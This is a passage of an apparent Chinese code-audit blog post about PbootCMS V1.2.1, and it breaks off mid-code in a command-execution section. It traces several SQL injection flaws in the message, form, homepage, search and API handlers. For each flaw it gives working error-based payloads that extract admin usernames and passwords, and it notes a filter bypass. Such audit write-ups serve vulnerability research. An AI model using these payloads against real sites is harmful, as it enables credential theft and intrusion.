&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的<code>$data[$value-&gt;name] = post($value-&gt;name);</code>表明将POST提交的数组直接赋值给<code>$data</code>–&gt;进入<code>addmessage()---&gt;inert()</code> 造成注入。<br>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url: http:&#x2F;&#x2F;pboot.com&#x2F;index.php&#x2F;Message&#x2F;add</span><br><span class="line">POST: contacts[contacts&#96;) values (updatexml(1,concat(0x7e,user(),1),1)); -- a]&#x3D;1&amp;content&#x3D;1&amp;mobile&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gt9t80ebxgj30tx05sdjc.jpg" alt="image-20210808181715295"></p>
+<p>insert[截取关键部分流程]</p>
+<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gt9t85jp7xj31340lkdv7.jpg" alt="image-20210808181058615"></p>
+<h1 id="insert-注入二-通话"><a href="#insert-注入二-通话" class="headerlink" title="insert 注入二[通话]"></a>insert 注入二[通话]</h1><p>A.这里继续寻找在<code>home\Model</code>中寻找调用<code>insert</code>操作的函数,发现函数<code>addForm()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#home\Model\ParserModel.php  addForm()</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addForm</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parent</span>::table(<span class="variable">$table</span>)-&gt;insert(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们在搜索下<code>home\controller</code>中调用<code>addForm()</code>函数的方法,在<code>FormController.php</code>找到<code>add()</code>方法:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#home\controller\FormController.php add()</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>) &#123;</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$fcode</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            alert_back(<span class="string">&#x27;表单提交地址有误，留言提交请使用留言专用地址!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">if</span> (! <span class="variable">$form</span> = <span class="keyword">$this</span>-&gt;model-&gt;getFormField(<span class="variable">$fcode</span>)) &#123;</span><br><span class="line">        alert_back(<span class="string">&#x27;接收表单不存在任何字段，请核对后重试！&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$form</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="variable">$field_data</span> = post(<span class="variable">$value</span>-&gt;name);</span><br><span class="line">        <span class="keyword">if</span> (is_array(<span class="variable">$field_data</span>)) &#123; <span class="comment">// 如果是多选等情况时转换</span></span><br><span class="line">            <span class="variable">$field_data</span> = implode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$field_data</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$value</span>-&gt;required &amp;&amp; ! <span class="variable">$field_data</span>) &#123;</span><br><span class="line">            alert_back(<span class="variable">$value</span>-&gt;description . <span class="string">&#x27;不能为空！&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$data</span>[<span class="variable">$value</span>-&gt;name] = post(<span class="variable">$value</span>-&gt;name);</span><br><span class="line">            <span class="variable">$mail_body</span> .= <span class="variable">$value</span>-&gt;description . <span class="string">&#x27;：&#x27;</span> . post(<span class="variable">$value</span>-&gt;name) . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;model-&gt;addForm(<span class="variable">$value</span>-&gt;table_name, <span class="variable">$data</span>)) &#123;</span><br></pre></td></tr></table></figure>
+
+<p>我们发现我们留言提示接收表单不存在任何字段，请核对后重试，说明这个功能是需要开开的，我在后台么找到。我们跟进<code>getFormField()</code>查看一下干了些什么吧</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormField</span>(<span class="params"><span class="variable">$fcode</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;   ...</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parent</span>::table(<span class="string">&#x27;ay_form a&#x27;</span>)-&gt;field(<span class="variable">$field</span>)</span><br><span class="line">        -&gt;where(<span class="string">&quot;a.fcode=&#x27;<span class="subst">$fcode</span>&#x27;&quot;</span>)</span><br><span class="line">        -&gt;join(<span class="variable">$join</span>)</span><br><span class="line">        -&gt;order(<span class="string">&#x27;b.sorting ASC,b.id ASC&#x27;</span>)</span><br><span class="line">        -&gt;select();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>他是在ay_from里面寻找field,而我们通话传入的field是2,所以我们进入数据库添以下<br><code>ay_from_field</code></p>
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gt9t8ceyyfj30yf06j0xs.jpg" alt="image-20210808185802345"></p>
+<p><code>ay_from</code></p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gt9t8hfmt4j30vi05bq64.jpg" alt="image-20210808185629109"></p>
+<p>然后再创建一个<code>ay_tel</code>表字段就无所谓了<br>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url: http:&#x2F;&#x2F;pboot.com&#x2F;index.php&#x2F;Form&#x2F;add&#x2F;fcode&#x2F;2</span><br><span class="line">POST: tel[id&#96;) values (1 and updatexml(1,concat(0x7e,user()),1)); -- a]&#x3D;12</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gt9t8ndcf1j31f80kcwpb.jpg" alt="image-20210808190026747"></p>
+<h1 id="主页处SQL注入"><a href="#主页处SQL注入" class="headerlink" title="主页处SQL注入"></a>主页处SQL注入</h1><p><strong>代码分析:</strong><br>A.这里继续寻找在<code>home\Model</code>中寻找调用<code>where</code>操作的函数<br>找到2处<code>getList</code>与<code>getSpecifyList</code>,两处的利用点都在<code>where</code>操作里:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getList</span>(<span class="params"><span class="variable">$scode</span>, <span class="variable">$num</span>, <span class="variable">$order</span>, <span class="variable">$filter</span> = <span class="keyword">array</span>(<span class="params"></span>), <span class="variable">$where</span> = <span class="keyword">array</span>(<span class="params"></span>), <span class="variable">$fuzzy</span> = <span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parent</span>::table(<span class="string">&#x27;ay_content a&#x27;</span>)-&gt;field(<span class="variable">$fields</span>)</span><br><span class="line">        -&gt;where(<span class="variable">$where1</span>, <span class="string">&#x27;OR&#x27;</span>)</span><br><span class="line">        -&gt;where(<span class="variable">$where2</span>)    </span><br><span class="line">        <span class="comment">//触发点</span></span><br><span class="line">        -&gt;where(<span class="variable">$where</span>, <span class="string">&#x27;AND&#x27;</span>, <span class="string">&#x27;AND&#x27;</span>, <span class="variable">$fuzzy</span>)</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getSpecifyList</span>(<span class="params"><span class="variable">$scode</span>, <span class="variable">$num</span>, <span class="variable">$order</span>, <span class="variable">$filter</span> = <span class="keyword">array</span>(<span class="params"></span>), <span class="variable">$where</span> = <span class="keyword">array</span>(<span class="params"></span>), <span class="variable">$fuzzy</span> = <span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parent</span>::table(<span class="string">&#x27;ay_content a&#x27;</span>)-&gt;field(<span class="variable">$fields</span>)</span><br><span class="line">        -&gt;where(<span class="variable">$where1</span>, <span class="string">&#x27;OR&#x27;</span>)</span><br><span class="line">        -&gt;where(<span class="variable">$where2</span>) </span><br><span class="line">        <span class="comment">//触发点</span></span><br><span class="line">        -&gt;where(<span class="variable">$where</span>, <span class="string">&#x27;AND&#x27;</span>, <span class="string">&#x27;AND&#x27;</span>, <span class="variable">$fuzzy</span>)</span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>B.我们再搜索下<code>home\controller</code>中调用<code>getList()</code>或<code>getSpecifyList（）</code>函数的方法,在<code>ParserController.php</code>找到<code>parserSpecifyListLabel()</code>方法:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parserSpecifyListLabel</span>(<span class="params"><span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/\&#123;pboot:list(\s+[^&#125;]+)?\&#125;([\s\S]*?)\&#123;\/pboot:list\&#125;/&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern2</span> = <span class="string">&#x27;/\[list:([\w]+)(\s+[^]]+)?\]/&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match_all(<span class="variable">$pattern</span>, <span class="variable">$content</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">        <span class="variable">$count</span> = count(<span class="variable">$matches</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$count</span>; <span class="variable">$i</span> ++) &#123;</span><br><span class="line">            <span class="comment">// 获取调节参数</span></span><br><span class="line">            <span class="variable">$params</span> = <span class="keyword">$this</span>-&gt;parserParam(<span class="variable">$matches</span>[<span class="number">1</span>][<span class="variable">$i</span>]);</span><br><span class="line">            ...</span><br><span class="line">            <span class="comment">// 数据筛选</span></span><br><span class="line">            <span class="variable">$where2</span> = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;<span class="comment">//漏洞触发点</span></span><br><span class="line">                <span class="keyword">if</span> (substr(<span class="variable">$key</span>, <span class="number">0</span>, <span class="number">4</span>) == <span class="string">&#x27;ext_&#x27;</span>) &#123; <span class="comment">// 其他字段不加入</span></span><br><span class="line">                    <span class="variable">$where2</span>[<span class="variable">$key</span>] = get(<span class="variable">$key</span>); </span><br><span class="line">                &#125;</span><br><span class="line">            &#125; </span><br><span class="line">            ...</span><br><span class="line">            <span class="comment">// 读取数据</span></span><br><span class="line">            <span class="comment">//5 4   date DESC,sorting ASC,id DESC  array(0)</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$page</span>) &#123;</span><br><span class="line">                <span class="variable">$data</span> = <span class="keyword">$this</span>-&gt;model-&gt;getList(<span class="variable">$scode</span>, <span class="variable">$num</span>, <span class="variable">$order</span>, <span class="variable">$where1</span>, <span class="variable">$where2</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$data</span> = <span class="keyword">$this</span>-&gt;model-&gt;getSpecifyList(<span class="variable">$scode</span>, <span class="variable">$num</span>, <span class="variable">$order</span>, <span class="variable">$where1</span>, <span class="variable">$where2</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+
+<p>C.阅读代码先判断GET传输过来的<code>key</code>值前4位是否为<code>ext_</code>(扩展字段),如果是的话,直接赋值给<code>$where2</code>,然后进入读取数据操作,调用<code>getList</code>或<code>getSpecifyLis</code><br>触发注入。</p>
+<p>D.我们追溯调用该<code>parserSpecifyListLabel()</code>函数的方法:<br><code>parserSpecifyListLabel()---&gt;parserAfter()---&gt;index(IndexController.php)</code> 查看该index函数:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="built_in">parent</span>::parser(<span class="string">&#x27;index.html&#x27;</span>); <span class="comment">// 框架标签解析</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;parser-&gt;parserAfter(<span class="variable">$content</span>); <span class="comment">// CMS公共标签后置解析   跟进这个方法</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;cache(<span class="variable">$content</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里逻辑就很清楚了,利用系统解析list标签下的ext扩展字段来进行注入。<br>这里key值为任意扩展字段(<code>ext_price ext_type ext_color</code>)即可:</p>
+<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gt9t8u94voj30q5068q5t.jpg" alt="image-20210808204952797"></p>
+<p>漏洞涉及文件:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IndexController.php的index()--&gt;parserAfter()--&gt;parserSpecifyListLabel()--&gt;getList()&#x2F;getSpecifyList()--&gt;where() </span><br></pre></td></tr></table></figure>
+
+<p>直接拼接key造成注入</p>
+<p><strong>漏洞利用:</strong><br>因为系统会将空格转化为_ 我们可用/**/来绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: http:&#x2F;&#x2F;pbootcms&#x2F;index.php?ext_price%3D1&#x2F;**&#x2F;and&#x2F;**&#x2F;updatexml(1,concat(0x7e,(SELECT&#x2F;**&#x2F;distinct&#x2F;**&#x2F;concat(0x23,username,0x23,password)&#x2F;**&#x2F;FROM&#x2F;**&#x2F;ay_user&#x2F;**&#x2F;limit&#x2F;**&#x2F;0,1),0x7e),1));%23&#x3D;r0ser1</span><br></pre></td></tr></table></figure>
+
+<p>因为updatexml的最大长度为32位,所以在查询password时会显示不全,我们在实战过程中可以单独读取password字段或者利用其他函数注入即可。例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(password,15,20)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gt9t8zgl5yj31c80m04m7.jpg" alt="image-20210808211052705"></p>
+<h1 id="搜索处注入"><a href="#搜索处注入" class="headerlink" title="搜索处注入"></a>搜索处注入</h1><p>代码分析:<br>A.我们继续搜索<code>home\controller</code>中调用<code>getList()</code>或<code>getSpecifyList（）</code>函数的方法,在<code>ParserController.php</code>找到<code>parserSearchLabel()</code>方法。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parserSearchLabel</span>(<span class="params"><span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/\&#123;pboot:search(\s+[^&#125;]+)?\&#125;([\s\S]*?)\&#123;\/pboot:search\&#125;/&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern2</span> = <span class="string">&#x27;/\[search:([\w]+)(\s+[^]]+)?\]/&#x27;</span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 存储搜索条件，条件为“并列”关系，由于为模糊匹配，条件为空时意味着“任意”</span></span><br><span class="line">            <span class="variable">$where2</span> = <span class="keyword">array</span>();</span><br><span class="line">    ...</span><br><span class="line">            <span class="comment">// 数据接收</span></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (! ! <span class="variable">$value</span> = get(<span class="variable">$key</span>, <span class="string">&#x27;vars&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="variable">$where2</span>[<span class="variable">$key</span>] = <span class="variable">$value</span>;<span class="comment">//key 可控</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">    ...</span><br><span class="line">            <span class="comment">// 读取数据</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="variable">$data</span> = <span class="keyword">$this</span>-&gt;model-&gt;getList(<span class="variable">$scode</span>, <span class="variable">$num</span>, <span class="variable">$order</span>, <span class="variable">$where1</span>, <span class="variable">$where2</span>, <span class="variable">$fuzzy</span>)) &#123;</span><br><span class="line">            ...</span><br></pre></td></tr></table></figure>
+
+<p>这里代码逻辑:将<code>GET</code>传输过来的字段直接赋值给<code>where2</code>数组 接着进入<code>getList()</code>方法 造成注入</p>
+<p>B.然后同上,搜索<code>home\controller</code>中调用<code>parserSearchLabel()</code>的方法,我们追溯调用该<code>parserSearchLabel()</code>函数的方法:<br><code>parserSearchLabel()---&gt;index(SearchController.php)</code> 查看该index函数:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="built_in">parent</span>::parser(<span class="string">&#x27;search.html&#x27;</span>); <span class="comment">// 框架标签解析</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;parser-&gt;parserSearchLabel(<span class="variable">$content</span>); <span class="comment">// 搜索结果标签    跟进这个地方</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里逻辑就很清楚了,利用系统解析<code>search</code>标签字段而对<code>get</code>传输进来的参数无有效过滤造成注入。</p>
+<p>C.涉及文件:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SearchController.php的index()---&gt;parserSearchLabel()--&gt;getList()&#x2F;getSpecifyList()---&gt;where() </span><br></pre></td></tr></table></figure>
+
+<p><strong>漏洞利用:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: http:&#x2F;&#x2F;pbootcms&#x2F;index.php&#x2F;search?updatexml(1,concat(0x7e,(SELECT&#x2F;**&#x2F;distinct&#x2F;**&#x2F;concat(0x23,username,0x23,password)&#x2F;**&#x2F;FROM&#x2F;**&#x2F;ay_user&#x2F;**&#x2F;limit&#x2F;**&#x2F;0,1),0x7e),1));%23&#x3D;r0ser1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gt9t974embj31a50fon9f.jpg" alt="image-20210808211644332"></p>
+<h1 id="API注入"><a href="#API注入" class="headerlink" title="API注入"></a>API注入</h1><p>A.我们现在搜索<code>api\controller</code>中调用<code>getList()</code>或<code>getSpecifyList（）</code>函数的方法,在<code>CmsController.php</code>找到``search()`方法。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">search</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="variable">$_POST</span>) &#123;</span><br><span class="line">        json(<span class="number">0</span>, <span class="string">&#x27;请使用POST提交！&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ·······</span><br><span class="line">            <span class="comment">// 数据接收</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (! ! <span class="variable">$value</span> = get(<span class="variable">$key</span>, <span class="string">&#x27;vars&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$where</span>[<span class="variable">$key</span>] = <span class="variable">$value</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ········</span><br><span class="line">        <span class="comment">// 读取数据</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="keyword">$this</span>-&gt;model-&gt;getList(<span class="variable">$acode</span>, <span class="variable">$scode</span>, <span class="variable">$num</span>, <span class="variable">$order</span>, <span class="variable">$where</span>, <span class="variable">$fuzzy</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这里代码逻辑:将<code>GET</code>传输过来的字段直接赋值给<code>where</code>数组 接着进入<code>getList()</code>方法 造成注入，这里我们需要再后台开启如下设置<br><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gt9t9cwc6xj30vs0d6wj4.jpg" alt="image-20210808213707227"></p>
+<p>漏洞利用:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload: </span><br><span class="line">http:&#x2F;&#x2F;pbootcms&#x2F;api.php&#x2F;cms&#x2F;search?1%3D1)and(updatexml(1,concat(0x7e,(SELECT&#x2F;**&#x2F;distinct&#x2F;**&#x2F;concat(0x23,username,0x3a,password,0x23)&#x2F;**&#x2F;FROM&#x2F;**&#x2F;ay_user&#x2F;**&#x2F;limit&#x2F;**&#x2F;0,1),0x7e),1))--&#x3D;r0ser1</span><br><span class="line"></span><br><span class="line">POST任意提交一个数据就好</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gt9t9ibflzj31e60butno.jpg" alt="image-20210808214438429"></p>
+<h1 id="鸡肋SQL注入漏洞发现"><a href="#鸡肋SQL注入漏洞发现" class="headerlink" title="鸡肋SQL注入漏洞发现"></a>鸡肋SQL注入漏洞发现</h1><p>这其实是一个不规范的写法导致的SQL注入。因为我们上面贴了代码，我们知道value是有严格过滤的，但是这套程序的SQL语句大部分是字符串的拼接只要带入 <code>&#39;</code> 基本即注入，但如果程序带入数据库时不需要呢？例如下面粗心小猿，应该还有其他的，就不研究了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//查询用户</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getUser</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="built_in">parent</span>::table(<span class="string">&#x27;ay_testuser&#x27;</span>)-&gt;where(<span class="string">&quot;id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>)-&gt;find();</span><br><span class="line">  <span class="comment">// 规范写法 vs 不规范写法？</span></span><br><span class="line"> <span class="keyword">return</span> <span class="built_in">parent</span>::table(<span class="string">&#x27;ay_testuser&#x27;</span>)-&gt;where(<span class="string">&quot;id=&quot;</span>.<span class="variable">$id</span>)-&gt;find(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gt9t9oq4atj31dp0fwwnm.jpg" alt="image-20210807232601681"></p>
+<h1 id="前台无限制命令执行"><a href="#前台无限制命令执行" class="headerlink" title="前台无限制命令执行"></a>前台无限制命令执行</h1><p>帮助手册文件路径：PbootCMS-V1.2.1\doc\help.chm</p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gt9t9vh92lj30pg08vn2m.jpg" alt="image-20210808220250773"></p>
+<p>在Home下搜索哪里使用了if标签</p>
+<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gt9ta33ix0j316m0idds9.jpg" alt="image-20210808220555435"></p>
+<p>文件路径：apps\home\controller\ParserController.php<br><code>parserIfLabel</code>方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 解析IF条件标签</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parserIfLabel</span>(<span class="params"><span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/\&#123;pboot:if\(([^&#125;]+)\)\&#125;([\s\S]*?)\&#123;\/pboot:if\&#125;/&#x27;</span>;</span><br><span class="line"><span class="variable">$pattern2</span> = <span class="string">&#x27;/pboot:([0-9])+if/&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match_all(<span class="variable">$pattern</span>, <span class="variable">$content</span>, <span 